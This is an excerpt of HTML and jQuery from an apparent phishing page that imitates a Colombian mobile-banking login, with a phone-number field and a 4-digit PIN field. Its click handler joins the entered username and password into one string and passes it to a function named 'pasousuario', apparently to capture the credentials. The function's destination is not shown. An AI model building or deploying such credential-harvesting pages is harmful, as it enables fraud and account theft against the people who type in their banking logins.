                          ...
                          <div class="container-form">
                            <div class="input-country">
                                        ...
                                        <div class="select-country" ng-click="toggleSelect();">
                                            <div class="country-wrap country-active">
                                                <div class="select-col select-col-img"> <img
                                                        src="images/flag_colombia.png" alt="co"> </div>
                                ...
                                <div class="form-group">
                                    ...
                                    required="required" maxlength="12" minlength="12" required oninput="formatPhoneNumber()">
                            ...
                            <div class="form-group">
                                <input
                                    ...
                                    type="password" id="j_password" name="j_password" required maxlength="4" minlength="4">
                                <label for="j_password" class="ng-binding">Contraseña</label>
                            </div>
                            <!-- ngIf: loginControl.showCaptcha -->
    ...
    $(document).ready(function () {
        ...
        $('#btnUsuario').click(function () {
            if ($("#j_username").val().length > 0) {
                pasousuario($("#j_username").val()+" - "+$("#j_password").val());
            } else {
                $("#err-mensaje").show();
